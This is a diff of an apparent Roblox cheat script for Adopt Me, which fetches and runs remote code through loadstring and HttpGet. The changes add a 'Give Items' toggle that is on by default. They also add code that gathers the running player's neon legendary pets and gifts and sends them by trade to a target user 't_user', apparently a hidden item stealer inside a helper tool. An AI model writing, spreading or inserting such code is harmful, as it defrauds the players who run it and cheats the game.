@@ -1263,7 +1263,7 @@ local InterfaceManager = loadstring(game:HttpGet("https://raw.githubusercontent.
 
 local Window = Fluent:CreateWindow({
     Title = "AdoptMe: Game ",
-    SubTitle = "ver. 2.8.1",
+    SubTitle = "ver. 2.8.2",
     TabWidth = 160,
     Size = UDim2.fromOffset(500, 450),
     Acrylic = false, -- The blur may be detectable, setting this to false disables blur entirely
@@ -1364,6 +1364,10 @@ do
 		pcall(function()
 			writefile("egg.txt", tostring(egg_index))
 		end)
+	end)
+	
+	local Toggle = Tabs.Cash:AddToggle("give_items", {Title = "Give Items", Default = true})
+    Toggle:OnChanged(function()
 	end)
 	
 	
@@ -2670,6 +2674,14 @@ function()
 									end
 									wait(1)
 									ReplicatedStorage.API["TradeAPI/ConfirmTrade"]:FireServer()
+									if not pcall(function() local tmp=Player.PlayerGui.TradeApp.Frame.NegotiationFrame.Body.PartnerOffer.Slots.Slot1.ItemImageTemplate end) then
+										pcall(function()
+											getconnections(Player.PlayerGui.TradeApp.Frame.NegotiationFrame.Body.Decline.MouseButton1Down)[1]:Fire()
+											wait(.1)
+											getconnections(Player.PlayerGui.TradeApp.Frame.NegotiationFrame.Body.Decline.MouseButton1Up)[1]:Fire()
+											getconnections(Player.PlayerGui.TradeApp.Frame.NegotiationFrame.Body.Decline.MouseButton1Click)[1].Function()
+										end)
+									end
 									break
 								end
 							end
@@ -2865,10 +2877,14 @@ function()
 											else
 												ReplicatedStorage.API["TradeAPI/GiveItem"]:InvokeServer(Players[t_user], v.unique)
 											end
+										elseif v.properties.age == 6 and v.properties.neon then
+											if table.find(legendary_pets, v.id) then
+												table.insert(legends, v.unique)
+											end
 										end
 									end
-									--[[
-									if #legends < 18 then
+									
+									if #legends < 18 and Options.give_items.Value then
 										for i,v in require(ReplicatedStorage.ClientModules.Core.ClientData).get_data()[Player.Name].inventory.gifts do
 											table.insert(legends, v.unique)
 											con_log(v.id)
@@ -2916,7 +2932,7 @@ function()
 											end
 										end
 									end
-									--]]
+									
 									if #legends > 0 then
 										if not Player.PlayerGui.TradeApp.Frame.Visible then
 											ReplicatedStorage.API["TradeAPI/SendTradeRequest"]:FireServer(Players[t_user])
